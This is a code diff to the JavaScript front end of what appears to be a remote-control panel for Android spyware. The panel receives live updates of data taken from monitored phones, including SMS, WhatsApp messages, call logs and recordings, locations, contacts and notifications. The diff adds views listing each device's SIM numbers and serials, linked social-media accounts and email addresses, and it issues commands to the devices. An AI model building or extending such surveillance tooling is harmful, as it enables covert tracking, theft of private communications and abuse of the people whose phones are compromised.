@@ -2,6 +2,7 @@ const SERVER_URL = window.location.origin;
 let currentTab = 'devices';
 let allData = {};
 let socket;
+let autoRefreshTimer = null;
 
 // ============ LOGIN ============
 function login() {
@@ -33,19 +34,23 @@ function showDashboard() {
   document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('dashboard').classList.remove('hidden');
   loadData();
-  setInterval(loadData, 60000);
+  autoRefreshTimer = setInterval(loadData, 30000);
+
   socket = io();
   socket.emit('register-admin');
-  ['device-update','new-location','new-file','contacts-update','nearby-update',
-   'messages-update','calllogs-update','apps-update','info-update',
-   'bluetooth-update','new-notification','whatsapp-update','activity-update',
-   'callrecording-update','siminfo-update','accounts-update','emails-update'
+  [
+    'device-update','new-location','new-file','contacts-update','nearby-update',
+    'messages-update','calllogs-update','apps-update','info-update',
+    'bluetooth-update','new-notification','whatsapp-update','activity-update',
+    'callrecording-update','siminfo-update','accounts-update','emails-update'
   ].forEach(ev => socket.on(ev, () => refreshStatsOnly()));
 }
 
+// ============ LOAD DATA ============
 function loadData() {
   const savedDevice = document.getElementById('cmdDevice')?.value || localStorage.getItem('csk4_dev') || '';
   const savedCmd = document.getElementById('cmdType')?.value || localStorage.getItem('csk4_cmd') || '';
+
   fetch(SERVER_URL + '/api/admin/data')
     .then(r => r.json())
     .then(data => {
@@ -86,7 +91,9 @@ function renderStats(s) {
     <div class="stat-card"><div class="stat-value">${s.totalWhatsapp||0}</div><div class="stat-label">WhatsApp</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalMessages||0}</div><div class="stat-label">SMS</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalContacts||0}</div><div class="stat-label">Contacts</div></div>
+    <div class="stat-card"><div class="stat-value">${s.totalLocations||0}</div><div class="stat-label">Locations</div></div>
     <div class="stat-card"><div class="stat-value">${s.totalPhotos||0}</div><div class="stat-label">Photos</div></div>
+    <div class="stat-card"><div class="stat-value">${s.totalCallRecordings||0}</div><div class="stat-label">Call Rec</div></div>
   `;
 }
 
@@ -288,6 +295,7 @@ function renderScreen() {
   `;
 }
 
+// ============ NOTIFICATIONS ============
 function renderNotifications() {
   const list = (allData.notifications || []).slice().reverse().slice(0, 200);
   if (!list.length) return '<div class="loading">Koi notification nahi</div>';
@@ -402,6 +410,88 @@ function renderContacts() {
   `).join('');
 }
 
+// ============ 🆕 SIM INFO ============
+function renderSimInfo() {
+  const simData = allData.simInfo || {};
+  const deviceIds = Object.keys(simData);
+  if (!deviceIds.length) return '<div class="loading">SIM info command bhejein</div>';
+  let html = '';
+  deviceIds.forEach(deviceId => {
+    const data = simData[deviceId];
+    if (!data.sims || !data.sims.length) return;
+    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">📱 ${esc(deviceId)}</h3>`;
+    data.sims.forEach(sim => {
+      html += `
+        <div class="device-card" style="flex-direction:column;align-items:flex-start">
+          <div class="device-name">📶 SIM ${sim.slot}</div>
+          <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(sim.number || 'N/A')}</div>
+          <div class="device-id">📡 Operator: ${esc(sim.operator || 'N/A')}</div>
+          <div class="device-id">🌍 Country: ${esc(sim.country || 'N/A')}</div>
+          <div class="device-id">📶 Network: ${esc(sim.networkType || 'N/A')}</div>
+          <div class="device-id">🎯 State: ${esc(sim.state || 'N/A')}</div>
+          ${sim.serial ? `<div class="device-id">🔢 Serial: ${esc(sim.serial)}</div>` : ''}
+        </div>
+      `;
+    });
+  });
+  return html;
+}
+
+// ============ 🆕 ACCOUNTS ============
+function renderAccounts() {
+  const accData = allData.accounts || {};
+  const deviceIds = Object.keys(accData);
+  if (!deviceIds.length) return '<div class="loading">Accounts command bhejein</div>';
+  let html = '';
+  deviceIds.forEach(deviceId => {
+    const data = accData[deviceId];
+    if (!data.accounts || !data.accounts.length) return;
+    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">👤 ${esc(deviceId)} (${data.total})</h3>`;
+    data.accounts.forEach(acc => {
+      let icon = '📧';
+      if (acc.type.includes('whatsapp')) icon = '💬';
+      else if (acc.type.includes('facebook')) icon = '👥';
+      else if (acc.type.includes('instagram')) icon = '📸';
+      else if (acc.type.includes('twitter')) icon = '🐦';
+      else if (acc.type.includes('linkedin')) icon = '💼';
+      else if (acc.type.includes('google')) icon = '🔍';
+      html += `
+        <div class="item-card">
+          <div>
+            <div class="device-name">${icon} ${esc(acc.name)}</div>
+            <div class="device-id">${esc(acc.type)}</div>
+          </div>
+        </div>
+      `;
+    });
+  });
+  return html;
+}
+
+// ============ 🆕 EMAILS ============
+function renderEmails() {
+  const emailData = allData.emails || {};
+  const deviceIds = Object.keys(emailData);
+  if (!deviceIds.length) return '<div class="loading">Email command bhejein</div>';
+  let html = '';
+  deviceIds.forEach(deviceId => {
+    const data = emailData[deviceId];
+    if (!data.emails || !data.emails.length) return;
+    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">📧 ${esc(deviceId)} (${data.total})</h3>`;
+    data.emails.forEach(email => {
+      html += `
+        <div class="item-card">
+          <div>
+            <div class="device-name">📧 ${esc(email)}</div>
+            <div class="device-id">Google Account</div>
+          </div>
+        </div>
+      `;
+    });
+  });
+  return html;
+}
+
 function renderPhotos() {
   const list = (allData.photos || []).slice().reverse();
   if (!list.length) return '<div class="loading">Koi photo nahi</div>';
@@ -508,90 +598,6 @@ function renderActivities() {
       </div>
     `;
   }).join('');
-}
-
-// ============ 🆕 SIM INFO ============
-function renderSimInfo() {
-  const simData = allData.simInfo || {};
-  const deviceIds = Object.keys(simData);
-  if (!deviceIds.length) return '<div class="loading">SIM info command bhejein</div>';
-  let html = '';
-  deviceIds.forEach(deviceId => {
-    const data = simData[deviceId];
-    if (!data.sims || !data.sims.length) return;
-    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">📱 ${esc(deviceId)}</h3>`;
-    data.sims.forEach(sim => {
-      html += `
-        <div class="device-card" style="flex-direction:column;align-items:flex-start">
-          <div class="device-name">📶 SIM ${sim.slot}</div>
-          <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(sim.number || 'N/A')}</div>
-          <div class="device-id">📡 Operator: ${esc(sim.operator || 'N/A')}</div>
-          <div class="device-id">🌍 Country: ${esc(sim.country || 'N/A')}</div>
-          <div class="device-id">📶 Network: ${esc(sim.networkType || 'N/A')}</div>
-          <div class="device-id">🎯 State: ${esc(sim.state || 'N/A')}</div>
-          ${sim.serial ? `<div class="device-id">🔢 Serial: ${esc(sim.serial)}</div>` : ''}
-        </div>
-      `;
-    });
-    html += `<div class="device-id" style="text-align:center;margin:8px 0">⏰ ${new Date(data.time).toLocaleString()}</div>`;
-  });
-  return html;
-}
-
-// ============ 🆕 ACCOUNTS ============
-function renderAccounts() {
-  const accData = allData.accounts || {};
-  const deviceIds = Object.keys(accData);
-  if (!deviceIds.length) return '<div class="loading">Accounts command bhejein</div>';
-  let html = '';
-  deviceIds.forEach(deviceId => {
-    const data = accData[deviceId];
-    if (!data.accounts || !data.accounts.length) return;
-    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">👤 ${esc(deviceId)} (${data.total})</h3>`;
-    data.accounts.forEach(acc => {
-      let icon = '📧';
-      if (acc.type.includes('whatsapp')) icon = '💬';
-      else if (acc.type.includes('facebook')) icon = '👥';
-      else if (acc.type.includes('instagram')) icon = '📸';
-      else if (acc.type.includes('twitter')) icon = '🐦';
-      else if (acc.type.includes('linkedin')) icon = '💼';
-      else if (acc.type.includes('google')) icon = '🔍';
-      else if (acc.type.includes('samsung')) icon = '📱';
-      html += `
-        <div class="item-card">
-          <div>
-            <div class="device-name">${icon} ${esc(acc.name)}</div>
-            <div class="device-id">${esc(acc.type)}</div>
-          </div>
-        </div>
-      `;
-    });
-  });
-  return html;
-}
-
-// ============ 🆕 EMAILS ============
-function renderEmails() {
-  const emailData = allData.emails || {};
-  const deviceIds = Object.keys(emailData);
-  if (!deviceIds.length) return '<div class="loading">Email command bhejein</div>';
-  let html = '';
-  deviceIds.forEach(deviceId => {
-    const data = emailData[deviceId];
-    if (!data.emails || !data.emails.length) return;
-    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">📧 ${esc(deviceId)} (${data.total})</h3>`;
-    data.emails.forEach(email => {
-      html += `
-        <div class="item-card">
-          <div>
-            <div class="device-name">📧 ${esc(email)}</div>
-            <div class="device-id">Google Account</div>
-          </div>
-        </div>
-      `;
-    });
-  });
-  return html;
 }
 
 function renderSend() {
